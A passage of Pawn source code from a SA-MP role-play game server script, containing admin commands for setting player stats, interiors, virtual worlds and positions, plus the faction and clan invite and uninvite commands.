									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set DrugsSkill %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Drugs Skill to %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 16:
								{
									PlayerInfo[giveplayerid][pLawyerPoint] = amount;
									SaveKonVal(giveplayerid, "pLawyerPoint", amount);
									format(string, sizeof(string), "The Player Lawyer Points Set To %d", amount);

									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set Lawyer Point %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets your Lawyer Point to %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 17:
								{

                                    PlayerInfo[giveplayerid][pPremiumAccount] = amount;
                                    SaveKonVal(giveplayerid, "pPremiumAccount", amount);
                                    format(string, sizeof(string), "The Player PremiumAccount Was Set To %d", amount);



									new ws[512]
									format(ws, sizeof(ws), "%s Shoma Ra Premium Account Kard", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);

								}
								case 18:
								{
									PlayerInfo[giveplayerid][pRob] = amount;
									SaveKonVal(giveplayerid, "pRob", amount);
									format(string, sizeof(string), "The Player Rob Points Set To %d", amount);

									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set RobPoints %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Rob Point To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 19:
								{
									PlayerInfo[giveplayerid][pPunish] = amount;
									SaveKonVal(giveplayerid, "pPunish", amount);
									format(string, sizeof(string), "The Player Fpunish Set To %d", amount);

									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set Fp %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Faction Punish To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 20:
								{
									PlayerInfo[giveplayerid][pFwarn] = amount;
									SaveKonVal(giveplayerid, "pFwarn", amount);
									format(string, sizeof(string), "The Player Fwarn Set To %d", amount);

									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set FWarn %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Faction Warn To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 21:
								{
									PlayerInfo[giveplayerid][pSex] = amount;
									SaveKonVal(giveplayerid, "pSex", amount);
									format(string, sizeof(string), "The Player Sex Set To %d", amount);

									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set Sex %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets your Sex To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 22:
								{
									PlayerInfo[giveplayerid][pRobSkill ] = amount;
									SaveKonVal(giveplayerid, "pRobSkill ", amount);
									format(string, sizeof(string), "The Player Rob Skill Set To %d", amount);

									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set Rob Skill %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets your Rob Skill To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}

								default:
								{
									format(string, sizeof(string), "Invalid Stat Code.", amount);
								}

							}
							SendMessage(playerid, COLOR_GRAD1, string);
						}

					}//not valid id
			return 1;
		}
	}
//----------------------------------[SETINT]-----------------------------------------------
    if(strcmp(cmd, "/setint", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /setint [playerid/PartOfName] [interiorid]");
                return 1;
            }
            new playa;
            playa = ReturnUser(tmp);
            new intid;
            tmp = strtok(cmdtext, idx);
            intid = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 1)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        SetPlayerInterior(playa, intid);
                        format(string, sizeof(string), "   You havae set %s interior to %d.", giveplayer, intid);
                        SendClientMessage(playerid, COLOR_GRAD1, string);
                        format(string, sizeof(string), "   %s has set your interior to %d.", sendername, intid);
                        SendClientMessage(playa, COLOR_GRAD1, string);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
//----------------------------------[SETVW]-----------------------------------------------
    if(strcmp(cmd, "/setvw", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /setvw [playerid/PartOfName] [virworldid]");
                return 1;
            }
            new playa;
            playa = ReturnUser(tmp);
            new virid;
            tmp = strtok(cmdtext, idx);
            virid = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 1)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        SetPlayerVirtualWorld(playa, virid);
                        format(string, sizeof(string), "You have set %s virtual world to %d.", giveplayer, virid);
                        SendClientMessage(playerid, COLOR_GRAD1, string);
                        format(string, sizeof(string), "%s have set your virtual world to %d.", sendername, virid);
                        SendClientMessage(playa, COLOR_GRAD1, string);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
//----------------------------------[SKYDIVE]------------------------------------------------
    if(strcmp(cmd, "/skydive", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] >= 2)
            {
                GetPlayerPos(playerid, rx, ry, rz);
                if (IsPlayerConnected(playerid))
                {
                    GivePlayerTofang(playerid, 46, 0);
                    SetPlayerPosEx(playerid,rx, ry, rz+1500);
                    SendClientMessage(playerid, COLOR_RED, "GO!! GO!! GO!!");
                    Mahal[playerid] = 9999;
                    TooHouse[playerid] = 9999;
                    TooBiz[playerid] = 9999;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
//----------------------------------[FOURDIVE]------------------------------------------------
    if(strcmp(cmd, "/setmypos", true) == 0)
    {
     if(IsPlayerConnected(playerid))
     {
      if(PlayerInfo[playerid][pAdmin] <= 0)
      {
      SCM(playerid,COLOR_YELLOW2,"You are not an admin.");
      return 1;
      }
      new Float:PosX;
      new Float:PosY;
      new Float:PosZ;
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COLOR_ALI,"USAGE: /setmypos [PosX] [PosY] [PosZ]");
      return 1;
      }
      PosX = floatstr(tmp);
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COLOR_ALI,"USAGE: /setmypos [PosX] [PosY] [PosZ]");
      return 1;
      }
      PosY = floatstr(tmp);
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COLOR_ALI,"USAGE: /setmypos [PosX] [PosY] [PosZ]");
      return 1;
      }
      PosZ = floatstr(tmp);
      SetPlayerPosEx(playerid,PosX,PosY,PosZ);
      new striing[256];
      format(striing,sizeof(striing),"You are now in %f,%f,%f",PosX,PosY,PosZ);
      SCM(playerid,COLOR_LIGHTRED,striing);
      return 1;
      }
      return 1;
      }
      if(strcmp(cmd, "/createsbiz", true) == 0)
      {
      if(PlayerInfo[playerid][pAdmin] <= 7)
      {
      SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
      return 1;
      }
      if(IsPlayerConnected(playerid))
      {
      new forme[256];
      new Float:xx,Float:yy,Float:zz;
      GetPlayerPos(playerid,xx,yy,zz);
      format(forme,256,"0|The State|<Your Message>|No-one|%f|%f|%f|<Level Needed>|<Buy price>|<Entrance Cost>|0|0|%d|0|0|0",xx,yy,zz,GetPlayerInterior(playerid));
      SCM(playerid,COLOR_WHITE,forme);
      return 1;
      }
      return 1;
      }
    if(strcmp(cmd, "/fourdive", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /fourdive [playerid1] [playerid2] [playerid3] [playerid4]");
                return 1;
            }
            new para1;
            new para2;
            new para3;
            new para4;
            para1 = strval(tmp);
            tmp = strtok(cmdtext, idx);
            para2 = strval(tmp);
            tmp = strtok(cmdtext, idx);
            para3 = strval(tmp);
            tmp = strtok(cmdtext, idx);
            para4 = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 5)
            {
                if (IsPlayerConnected(para1)){ GivePlayerTofang(para1, 46, 0); Mahal[para1] = 9999; TooHouse[para1] = 9999;
            TooBiz[para1] = 9999;SetPlayerPosEx(para1,1536.0, -1360.0, 1350.0);SetPlayerInterior(para1,0);SendClientMessage(para1, COLOR_WHITE, "GO!! GO!! GO!!");}
                if ((IsPlayerConnected(para2)) && (para2>0)) { GivePlayerTofang(para2, 46, 0); Mahal[para2] = 9999; TooHouse[para2] = 9999;
            TooBiz[para2] = 9999;SetPlayerPosEx(para2,1536.0, -1345.0, 1350.0);SetPlayerInterior(para2,0);SendClientMessage(para2, COLOR_RED, "GO!! GO!! GO!!");}
                if ((IsPlayerConnected(para3)) && (para3>0)) { GivePlayerTofang(para3, 46, 0); Mahal[para3] = 9999; TooHouse[para3] = 9999;
            TooBiz[para3] = 9999;SetPlayerPosEx(para3,1552.0, -1345.0, 1350.0);SetPlayerInterior(para3,0);SendClientMessage(para3, COLOR_RED, "GO!! GO!! GO!!");}
                if ((IsPlayerConnected(para4)) && (para4>0)) { GivePlayerTofang(para4, 46, 0); Mahal[para4] = 9999; TooHouse[para4] = 9999;
            TooBiz[para4] = 9999;SetPlayerPosEx(para4,1552.0, -1360.0, 1350.0);SetPlayerInterior(para4,0);SendClientMessage(para4, COLOR_RED, "GO!! GO!! GO!!");}
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
                return 1;
            }
        }
        return 1;
    }
//----------------------------------[INVITE]------------------------------------------------
    if(strcmp(cmd, "/invite", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
         if (PlayerInfo[playerid][pLeader] >= 1 || PlayerInfo[playerid][pRank] >= 6)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /invite [playerid/PartOfName]");
                return 1;
            }
            new para1;
            new ftext[50];
            para1 = ReturnUser(tmp);
            if(para1 == playerid)
            {
            SCM(playerid,COLOR_ALI,"You cannot invite your self.");
            return 1;
            }
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                        if (PlayerInfo[para1][pMember] == 0 && PlayerInfo[para1][pLeader] == 0)
                        {
                            if(PlayerInfo[para1][pPunish] > 0)
                            {
                                SendClientMessage(playerid, COLOR_GRAD2, "Can't invite him, player have FactionPunish.");
                                return 1;
                            }
                            if(GetPlayerWantedLevel(para1) >= 1)
                            {
                            SCM(playerid,COLOR_LIGHTRED,"That player has Wanted level.");
                            return 1;
                            }
                            if(PlayerInfo[playerid][pLeader] == 1 || (PlayerInfo[playerid][pMember] == 1 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_COP;
                                SaveKonVal(para1, "pTeam", TEAM_COP);
                                ftext = "Police Departament";
                                ChosenSkin[para1] = 280;
                                SetPlayerSkin(para1, 280);
								SetPlayerColor(para1,COLOR_PD);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 2 || (PlayerInfo[playerid][pMember] == 2 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_COP;
                                SaveKonVal(para1, "pTeam", TEAM_COP);
                                ftext = "FBI";
								SetPlayerColor(para1,COLOR_FBI);
                                ChosenSkin[para1] = 286;
                                SetPlayerSkin(para1, 286);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 3 || (PlayerInfo[playerid][pMember] == 3 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_COP;
                                SaveKonVal(para1, "pTeam", TEAM_COP);
                                SetPlayerColor(para1,COLOR_NG);
                                ftext = "National Guard";
                                ChosenSkin[para1] = 93;
                                SetPlayerSkin(para1, 93);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 4 || (PlayerInfo[playerid][pMember] == 4 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_MEDIC;
                                SetPlayerColor(para1,COLOR_MEDIC);
                                SaveKonVal(para1, "pTeam", TEAM_MEDIC);
                                ftext = "Firemen/Ambulance";
                                ChosenSkin[para1] = 141;
                                SetPlayerSkin(para1, 141);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 5 || (PlayerInfo[playerid][pMember] == 5 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_SM;
                                SaveKonVal(para1, "pTeam", TEAM_SM);
                                ftext = "Silence Mafia";
                                SetPlayerColor(para1,0x5D7E8D00);
                                ChosenSkin[para1] = 121;
                                SetPlayerSkin(para1, 121);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 6 || (PlayerInfo[playerid][pMember] == 6 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_KM;
                                SaveKonVal(para1, "pTeam", TEAM_KM);
                                ftext = "The Killers Family";
                                SetPlayerColor(para1,0x3E353500);
                                ChosenSkin[para1] = 233;
                                SetPlayerSkin(para1, 233);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 7 || (PlayerInfo[playerid][pMember] == 7 && PINFO[playerid][pRank] >= 6)) return SCM(playerid, COLOR_LIGHTGREEN, "Mayors can't /invite.");
                            else if(PlayerInfo[playerid][pLeader] == 8 || (PlayerInfo[playerid][pMember] == 8 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_HITMAN;
                                SaveKonVal(para1, "pTeam", TEAM_HITMAN);
								SetPlayerColor(para1,0x8E232300);
                                ftext = "Hitman Agency"; ChosenSkin[para1] = 117;
                                SetPlayerSkin(para1, 117);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 9 || (PlayerInfo[playerid][pMember] == 9 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_NEWS;
                                SaveKonVal(para1, "pTeam", TEAM_NEWS);
                                SetPlayerColor(para1,0xFF828200);
                                ftext = "News Reporter"; ChosenSkin[para1] = 148;
                                SetPlayerSkin(para1, 148);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 10 || (PlayerInfo[playerid][pMember] == 10 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_TAXI;
                                SaveKonVal(para1, "pTeam", TEAM_TAXI);
                                SetPlayerColor(para1,COLOR_TAXI);
                                ftext = "Taxi Cab Company"; ChosenSkin[para1] = 255;
                                SetPlayerSkin(para1, 255);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 11 || (PlayerInfo[playerid][pMember] == 11 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_SI;
                                SaveKonVal(para1, "pTeam", TEAM_SI);
                                SetPlayerColor(para1,COLOR_SI);
                                ftext = "School Instructor"; ChosenSkin[para1] = 153;
                                SetPlayerSkin(para1, 153);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 12 || (PlayerInfo[playerid][pMember] == 12 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_DangerousTigers;
                                SaveKonVal(para1, "pTeam", TEAM_DangerousTigers);
                                SetPlayerColor(para1,0x19AF2300);
                                ftext = "Dangerous Tigers Family"; ChosenSkin[para1] = 105;
                                SetPlayerSkin(para1, 105);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 13 || (PlayerInfo[playerid][pMember] == 13 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_LegendaryMen;
                                SaveKonVal(para1, "pTeam", TEAM_LegendaryMen);
                                SetPlayerColor(para1,0xFFBA0000);
                                ftext = "Legendary Men Family"; ChosenSkin[para1] = 122;
                                SetPlayerSkin(para1, 122);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 14 || (PlayerInfo[playerid][pMember] == 14 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_FNF;
                                SaveKonVal(para1, "pTeam", TEAM_FNF);
                                SetPlayerColor(para1,0xB32CF600);
                                ftext = "Fast N Furious Family"; ChosenSkin[para1] = 185;
                                SetPlayerSkin(para1, 185);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 15 || (PlayerInfo[playerid][pMember] == 15 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_StormMen;
                                SaveKonVal(para1, "pTeam", TEAM_StormMen);
                                SetPlayerColor(para1,0x00ECEC00);
                                ftext = "Storm Men Family"; ChosenSkin[para1] = 173;
                                SetPlayerSkin(para1, 173);
                            }
                            else if(PlayerInfo[playerid][pLeader] == 16 || (PlayerInfo[playerid][pMember] == 16 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_TOW;
                                SaveKonVal(para1, "pTeam", TEAM_TOW);
                                SetPlayerColor(para1,0xF9F7CE00);
                                ftext = "Tow Car Company"; ChosenSkin[para1] = 50;
                                SetPlayerSkin(para1, 50);
                            }
                         else if(PlayerInfo[playerid][pLeader] == 17 || (PlayerInfo[playerid][pMember] == 17 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_STAFF;
                                SaveKonVal(para1, "pTeam", TEAM_STAFF);
                                ftext = "Staff"; ChosenSkin[para1] = 217;
                                SetPlayerColor(para1,0xF9F7CE00);
                                SetPlayerSkin(para1, 217);
                            }
                         else if(PlayerInfo[playerid][pLeader] == 19 || (PlayerInfo[playerid][pMember] == 19 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_TopBoys;
                                SaveKonVal(para1, "pTeam", TEAM_TopBoys);
                                SetPlayerColor(para1,0x0E47FF00);
                                ftext = "The Racers";
                            }
                            else if(PlayerInfo[playerid][pLeader] == 20 || (PlayerInfo[playerid][pMember] == 20 && PINFO[playerid][pRank] >= 6))
                            {
                                PlayerInfo[para1][pTeam] = TEAM_COP;
                                SaveKonVal(para1, "pTeam", TEAM_COP);
                                ftext = "SFPD";
                                ChosenSkin[para1] = 163;
                                SetPlayerColor(para1,COLOR_SFPD);
                                SetPlayerSkin(para1, 163);
                            }
                            else { return 1; }
                            GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            if(PlayerInfo[playerid][pMember] >= 1 && PINFO[playerid][pRank] >= 6)
                            {
                                PlayerInfo[para1][pMember] = PlayerInfo[playerid][pMember];
                                SaveKonVal(para1, "pMember", PlayerInfo[playerid][pMember]);
                            }
                            else if(PlayerInfo[playerid][pLeader] >= 1)
                            {
                                PlayerInfo[para1][pMember] = PlayerInfo[playerid][pLeader];
                                SaveKonVal(para1, "pMember", PlayerInfo[playerid][pLeader]);
                            }
                            PlayerInfo[para1][pRank] = 1;
                            SaveKonVal(para1, "pRank", 1);
                            PlayerInfo[para1][pFwarn] =0;
                            SaveKonVal(para1, "pFwarn", 0);
                            FactionLog(string);
                            //printf("News: %s has invited %s to join %s.", sendername, giveplayer, ftext);
                            format(string, sizeof(string), "* You have Joined the %s, you were invited by Leader %s", ftext, sendername);
                            SendClientMessage(para1, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* You have Invited %s to join the %s.", giveplayer,ftext);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            SetPlayerInterior(para1,0);
                            new rand = random(sizeof(gInviteSpawns));
                            SetPlayerPosEx(para1, gInviteSpawns[rand][0], gInviteSpawns[rand][1], gInviteSpawns[rand][2]); // Warp the player
                            Mahal[para1] = 9999;
                            TooHouse[para1] = 9999;
                            TooBiz[para1] = 9999;
                            SetPlayerFacingAngle(para1, gInviteSpawns[rand][3]);
                            SetPlayerCameraPos(para1,gInviteSpawns[rand][0] + 3, gInviteSpawns[rand][1], gInviteSpawns[rand][2]);
                            SetPlayerCameraLookAt(para1,gInviteSpawns[rand][0], gInviteSpawns[rand][1], gInviteSpawns[rand][2]);
                            TogglePlayerControllable(para1, 0);
                            SelectCharID[para1] = PlayerInfo[para1][pMember];
                            SelectCharPlace[para1] = 1;
                            new Member[64];
								if(PlayerInfo[playerid][pLeader] == 0) {
								format(Member, sizeof(Member), "%d",PlayerInfo[playerid][pMember]);
								}
								else {
								format(Member, sizeof(Member), "%d",PlayerInfo[playerid][pLeader]);
								}
								new reas[70];
								format(reas, sizeof(reas), "%s",PINFO[playerid][pName]);
                            AddLog(PINFO[para1][pName], Member, "Joined the faction", reas, 1);
                            PlayerInfo[para1][fSkin] = ChosenSkin[para1];
                            SaveKonVal(para1, "fSkin", ChosenSkin[para1]);
                            ShowPlayerDialog(para1, 427, DIALOG_STYLE_MSGBOX,"Chlothes:", "Press 'Next' to select the clothes.\nPress 'Done' once you have chosen the clothes.","Next", "Done");

                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "That player is in a family/faction.");
                            return 1;
                        }
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_YELLOW, "Only leaders can use this command.");
            }
        }
        return 1;
    }


    // CInvite

    if(strcmp(cmd, "/cinvite", true) == 0)
    {
         if (PlayerInfo[playerid][pClan] >= 1 && PlayerInfo[playerid][pcRank] >= 6)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /cinvite [PlayerID/PartOfName]");
                return 1;
            }
            new para1,ftext[50],c = PlayerInfo[playerid][pClan];
            para1 = ReturnUser(tmp);
            if(para1 == playerid)
            {
            SCM(playerid,COLOR_ALI,"You cannot invite your self.");
            return 1;
            }

	    if(DynamicClans[c][cSlots] <= DynamicClans[c][cSlot])
            {
            SCM(playerid,COLOR_ALI,"Clan Slot Is Full.");
            return 1;
            }
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                        if (PlayerInfo[para1][pClan] == 0)
                {
                            if  (GetPlayerWantedLevel(para1) >= 1)
                            {
                            SCM(playerid,COLOR_LIGHTRED,"That player has Wanted level.");
                            return 1;
                            }
                            GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
							PlayerInfo[para1][pClan] = PlayerInfo[playerid][pClan];
							SaveKonVal(para1, "pClan", PlayerInfo[playerid][pClan]);
                            PlayerInfo[para1][pcRank] = 1;
                            SaveKonVal(para1, "pcRank", 1);
                            FactionLog(string);
                            //printf("News: %s has invited %s to join %s.", sendername, giveplayer, ftext);
                            format(string, sizeof(string), "* You have Joined the %s, you were invited by Leader %s", ftext, sendername);
                            SendClientMessage(para1, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* You have Invited %s to join the %s.", giveplayer,ftext);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							GivePlayerTag(para1, DynamicClans[c][cTag]);
							new id;
							id = DynamicClans[c][cSQLid];
							DynamicClans[id][cSlot] += 1;
							SaveKonValC(id, "cSlot", DynamicClans[id][cSlot]);
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "That player is in a Clan.");
                            return 1;
                        }
                    }

            }

            else
            {
                SendClientMessage(playerid, COLOR_YELLOW, "Only leaders can use this command.");
            }
        }
        return 1;
    }
//----------------------------------[UNINVITE]------------------------------------------------
if(strcmp(cmd, "/cuninvite", true) == 0)// BUG Fixed
    {
        if(IsPlayerConnected(playerid))
        {
        if (PlayerInfo[playerid][pClan] == 0 && PINFO[playerid][pcRank] <= 6)
        {
        SCM(playerid,COLOR_YELLOW,"Only Clan leaders can use this command.");
        return 1;
        }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "Usage: /cuninvite [playerid/PartOfName]");
                return 1;
            }
            new para1;
                para1 = ReturnUser(tmp);
            if(para1 == playerid)
            {
            SCM(playerid,COLOR_ALI,"You cannot uninvite your self.");
            return 1;
            }
                    if(IsPlayerConnected(para1))
                    {
                            if (PlayerInfo[para1][pClan] > 0 && PlayerInfo[para1][pClan] == PlayerInfo[playerid][pClan])
                            {
                                GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                format(string, 256,"AdmCmd: %s has uninvited %s.", sendername, giveplayer);
                                //printf(string);
                                FactionLog(string);
                                format(string, sizeof(string), "You have been kicked from your Clan, by Leader %s", sendername);
                                SendClientMessage(para1, COLOR_LIGHTRED, string);
                                SendClientMessage(para1, COLOR_LIGHTBLUE, "You haven't a Clan Now.");

				new c = PlayerInfo[playerid][pClan];
				new id;
				id = DynamicClans[c][cSQLid];
				DynamicClans[id][cSlot] -= 1;
				SaveKonValC(id, "cSlot", DynamicClans[id][cSlot]);

                                //gTeam[para1] = TEAM_CIV;
                                PlayerInfo[para1][pClan] = 0;
                                SaveKonVal(para1, "pClan", 0);
                                PlayerInfo[para1][pcRank] = 0;
                                SaveKonVal(para1, "pcRank", 0);
								GetPlayerTag(para1);
                                MedicBill[para1] = 0;
                                ResetPlayerTofang(para1);
                                format(string, sizeof(string), "You have kicked %s from his Clan.", giveplayer);
                                SendClientMessage(playerid, COLOR_LIGHTRED, string);
                            }
                            else
                            {
                                format(string, sizeof(string), "That Player isn't in your Clan. You cannot uninvite him.");
                                SendClientMessage(playerid, COLOR_YELLOW, string);
                            }
                    }
        }
        return 1;
    }


    //


 if(strcmp(cmd, "/uninvite", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
        if (PlayerInfo[playerid][pLeader] == 0 && PINFO[playerid][pRank] <= 6)
        {
        SCM(playerid,COLOR_YELLOW,"Only leaders can use this command.");
        return 1;
        }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "Usage: /uninvite [FactionPunish] [playerid/PartOfName]");
                return 1;
            }
            new fp = strval(tmp);
            new para1;
            tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "Usage: /uninvite [FactionPunish] [playerid/PartOfName]");
                    return 1;
                }
                para1 = ReturnUser(tmp);
            if(para1 == playerid)
            {
            SCM(playerid,COLOR_ALI,"You cannot uninvite your self.");
            return 1;
            }
                    if(IsPlayerConnected(para1))
                    {
                            if ((PlayerInfo[para1][pMember] > 0 && PlayerInfo[para1][pMember] == PlayerInfo[playerid][pLeader]) || (PINFO[para1][pMember] > 0 && PINFO[playerid][pMember] >= 1 && PINFO[playerid][pRank] >= 6 && PINFO[para1][pMember] == PlayerInfo[playerid][pMember]))
                            {
                            if(fp >= 61 || fp < 0)
                            {
                            SCM(playerid,COLOR_ROUZ,"Error: Use a FactionPunish number between 0 and 60");
                            return 1;
                            }

									new Member[64];
									if(PlayerInfo[playerid][pLeader] == 0) {
									format(Member, sizeof(Member), "%d",PlayerInfo[playerid][pMember]);
									}
									else {
									format(Member, sizeof(Member), "%d",PlayerInfo[playerid][pLeader]);
									}

									new reas[70];
									format(reas, sizeof(reas), "%s",PINFO[playerid][pName]);
									new rease[256];
									format(rease, sizeof(rease), "Left the faction [FP%d] [R%d]",fp,PINFO[para1][pRank]);
									AddLog(PINFO[para1][pName], Member, rease, reas, 2);

                                GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                format(string, 256,"AdmCmd: %s has uninvited %s for %d fpunish.", sendername, giveplayer,fp);
                                //printf(string);
                                FactionLog(string);
                                format(string, sizeof(string), "You have been kicked from your Family / Faction, by Leader %s for %d fpunish.", sendername,fp);
                                SendClientMessage(para1, COLOR_LIGHTRED, string);
                                SendClientMessage(para1, COLOR_LIGHTBLUE, "You are now a Civilian again.");
                                //gTeam[para1] = TEAM_CIV;
                                PlayerInfo[para1][pTeam] = TEAM_CIV;
                                SaveKonVal(para1, "pTeam", TEAM_CIV);
                                PlayerInfo[para1][pMember] = 0;
                                SaveKonVal(para1, "pMember", 0);
                                PlayerInfo[para1][pRank] = 0;
